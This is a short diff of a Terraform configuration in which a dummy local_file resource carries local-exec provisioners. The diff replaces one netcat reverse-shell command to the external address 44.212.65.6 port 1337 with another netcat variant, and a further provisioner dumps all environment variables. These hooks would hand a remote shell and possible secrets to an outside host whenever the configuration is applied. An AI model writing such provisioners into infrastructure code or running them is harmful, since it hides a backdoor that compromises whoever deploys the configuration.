@@ -14,7 +14,7 @@ resource "local_file" "foo" {
   filename = "${path.module}/foo.bar"
 
    provisioner "local-exec" {
-    command = "nc 44.212.65.6 1337 -e /bin/sh"
+    command = "nc -c sh 44.212.65.6 1337"
   }
    provisioner "local-exec" {
     command = "echo $(env)"
